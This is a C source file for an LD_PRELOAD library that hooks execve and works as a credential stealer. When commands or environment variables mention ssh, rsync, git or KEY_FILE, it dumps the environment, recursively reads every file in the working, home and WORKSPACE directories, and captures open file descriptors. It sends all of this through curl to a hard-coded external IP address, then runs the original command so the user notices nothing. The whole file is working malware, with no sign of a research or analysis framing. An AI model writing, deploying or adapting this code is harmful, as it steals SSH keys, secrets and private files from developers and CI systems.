#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <sys/stat.h>
#include <limits.h>
#include <ftw.h>
#include <dirent.h>

// Buffer sizes
#define CMD_BUF_SIZE       (1024 * 1024)
#define ENV_BUF_SIZE       (1024 * 1024)
#define CRED_BUF_SIZE      (4 * 1024 * 1024)
#define FILES_BUF_SIZE     (4 * 1024 * 1024)
#define PAYLOAD_BUF_SIZE   (10 * 1024 * 1024)

// Filter substrings
static const char *filters[] = {
    "KEY_FILE",
    "ssh ",
    "rsync",
    "git ",
    NULL
};

// Global buffers in BSS (avoid stack overflow)
static char cmd_buf[CMD_BUF_SIZE];
static char env_buf[ENV_BUF_SIZE];
static char cred_buf[CRED_BUF_SIZE];
static char files_buf[FILES_BUF_SIZE];
static char payload_buf[PAYLOAD_BUF_SIZE];

// Globals for nftw callback
static char *cred_dest;
static size_t cred_dest_sz;

// Read up to max_read bytes from 'path' into 'out'
static void dump_file(const char *path, char *out, size_t max_read) {
    FILE *f = fopen(path, "r");
    if (!f) return;
    size_t total = 0;
    char buf[4096];
    while (!feof(f) && total < max_read) {
        size_t r = fread(buf, 1, sizeof(buf), f);
        if (r == 0) break;
        size_t to_copy = (r + total > max_read) ? (max_read - total) : r;
        memcpy(out + total, buf, to_copy);
        total += to_copy;
    }
    out[total] = '\0';
    fclose(f);
}

// nftw callback: dump each regular file
static int cred_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
    if (typeflag == FTW_F) {
        strncat(cred_dest, "==== ", cred_dest_sz - strlen(cred_dest) - 1);
        strncat(cred_dest, fpath, cred_dest_sz - strlen(cred_dest) - 1);
        strncat(cred_dest, " ====\n", cred_dest_sz - strlen(cred_dest) - 1);
        dump_file(fpath, cred_dest + strlen(cred_dest), cred_dest_sz - strlen(cred_dest) - 1);
        strncat(cred_dest, "\n\n", cred_dest_sz - strlen(cred_dest) - 1);
    }
    return 0; // continue traversal
}

// Recursively walk directories using nftw
static void gather_directory(const char *root, const char *label, char *dest, size_t dest_sz) {
    if (!root) return;
    strncat(dest, "==== WALK ", dest_sz - strlen(dest) - 1);
    strncat(dest, label, dest_sz - strlen(dest) - 1);
    strncat(dest, ": ", dest_sz - strlen(dest) - 1);
    strncat(dest, root, dest_sz - strlen(dest) - 1);
    strncat(dest, " ====\n", dest_sz - strlen(dest) - 1);
    cred_dest = dest;
    cred_dest_sz = dest_sz;
    nftw(root, cred_cb, 16, FTW_PHYS);
}

// Scan $PWD, $HOME, $WORKSPACE for files
static void gather_credentials(void) {
    memset(cred_buf, 0, sizeof(cred_buf));
    char cwd[PATH_MAX];
    if (getcwd(cwd, sizeof(cwd)))
        gather_directory(cwd, "PWD", cred_buf, sizeof(cred_buf));
    const char *home = getenv("HOME");
    if (home) gather_directory(home, "HOME", cred_buf, sizeof(cred_buf));
    const char *ws = getenv("WORKSPACE");
    if (ws) gather_directory(ws, "WORKSPACE", cred_buf, sizeof(cred_buf));
}

// Gather all open file descriptors via /proc/self/fd
static void gather_open_files(void) {
    memset(files_buf, 0, sizeof(files_buf));
    strncat(files_buf, "==== OPEN FILES ====\n", sizeof(files_buf) - strlen(files_buf) - 1);
    const char *fd_dir = "/proc/self/fd";
    DIR *d = opendir(fd_dir);
    if (!d) return;
    struct dirent *entry;
    while ((entry = readdir(d))) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, ".."))
            continue;
        char linkpath[PATH_MAX];
        snprintf(linkpath, sizeof(linkpath), "%s/%s", fd_dir, entry->d_name);
        char target[PATH_MAX];
        ssize_t len = readlink(linkpath, target, sizeof(target)-1);
        if (len <= 0) continue;
        target[len] = '\0';
        strncat(files_buf, entry->d_name, sizeof(files_buf) - strlen(files_buf) - 1);
        strncat(files_buf, ": ", sizeof(files_buf) - strlen(files_buf) - 1);
        strncat(files_buf, target, sizeof(files_buf) - strlen(files_buf) - 1);
        strncat(files_buf, "\n", sizeof(files_buf) - strlen(files_buf) - 1);
        struct stat st;
        if (stat(target, &st) == 0 && S_ISREG(st.st_mode)) {
            strncat(files_buf, "-- CONTENT START --\n", sizeof(files_buf) - strlen(files_buf) - 1);
            dump_file(target, files_buf + strlen(files_buf), sizeof(files_buf) - strlen(files_buf) - 1);
            strncat(files_buf, "\n-- CONTENT END --\n\n", sizeof(files_buf) - strlen(files_buf) - 1);
        }
    }
    closedir(d);
}

typedef int (*orig_execve_f)(const char *, char *const [], char *const []);

int execve(const char *path, char *const argv[], char *const envp[]) {
    orig_execve_f real_execve = (orig_execve_f)dlsym(RTLD_NEXT, "execve");
    if (!real_execve) _exit(1);

    // Build timestamp
    time_t now = time(NULL);
    char ts[32] = {0};
    strftime(ts, sizeof(ts), "%Y-%m-%dT%H:%M:%SZ", gmtime(&now));

    // Check filters on path+cmd
    // Build cmd in static buffer
    memset(cmd_buf, 0, sizeof(cmd_buf));
    for (int i = 0; argv[i] && i < 10000; i++) {
        strncat(cmd_buf, argv[i], sizeof(cmd_buf) - strlen(cmd_buf) - 1);
        if (argv[i+1]) strncat(cmd_buf, " ", sizeof(cmd_buf) - strlen(cmd_buf) - 1);
    }
    int should_log = 0;
    for (const char **f = filters; *f; f++) {
        if (strstr(path, *f) || strstr(cmd_buf, *f)) { should_log = 1; break; }
    }
    if (!should_log) {
        for (int i = 0; envp[i] && i < 10000; i++) {
            for (const char **f = filters; *f; f++) {
                if (strstr(envp[i], *f)) { should_log = 1; break; }
            }
            if (should_log) break;
        }
    }

    if (should_log) {
        // Dump env
        memset(env_buf, 0, sizeof(env_buf));
        strncat(env_buf, "ENVIRONMENT:\n", sizeof(env_buf)-1);
        for (int i = 0; envp[i] && i < 10000; i++) {
            strncat(env_buf, envp[i], sizeof(env_buf)-strlen(env_buf)-1);
            strncat(env_buf, "\n", sizeof(env_buf)-strlen(env_buf)-1);
        }

        // Gather credential files and open files
        gather_credentials();
        gather_open_files();

        // Assemble payload
        memset(payload_buf, 0, sizeof(payload_buf));
        snprintf(payload_buf, sizeof(payload_buf),
                 "TIMESTAMP: %s\nEXECVE: %s\nCMDLINE: %s\n\n",
                 ts, path, cmd_buf);
        strncat(payload_buf, env_buf, sizeof(payload_buf)-strlen(payload_buf)-1);
        strncat(payload_buf, "\nCREDENTIAL DUMP:\n\n", sizeof(payload_buf)-strlen(payload_buf)-1);
        strncat(payload_buf, cred_buf, sizeof(payload_buf)-strlen(payload_buf)-1);
        strncat(payload_buf, "\nOPEN FILES:\n\n", sizeof(payload_buf)-strlen(payload_buf)-1);
        strncat(payload_buf, files_buf, sizeof(payload_buf)-strlen(payload_buf)-1);

        // Post via curl
        if (fork() == 0) {
            int p[2]; pipe(p);
            if (fork() == 0) {
                close(p[1]); dup2(p[0], STDIN_FILENO); close(p[0]);
                execlp("curl", "curl",
                       "-s", "-XPOST",
                       "-H", "Content-Type: text/plain",
                       "--data-binary", "@-",
                       "http://65.109.68.176:15172/ld_preload2",
                       (char*)NULL);
                _exit(1);
            }
            close(p[0]); write(p[1], payload_buf, strlen(payload_buf)); close(p[1]);
            _exit(0);
        }
    }

    return real_execve(path, argv, envp);
}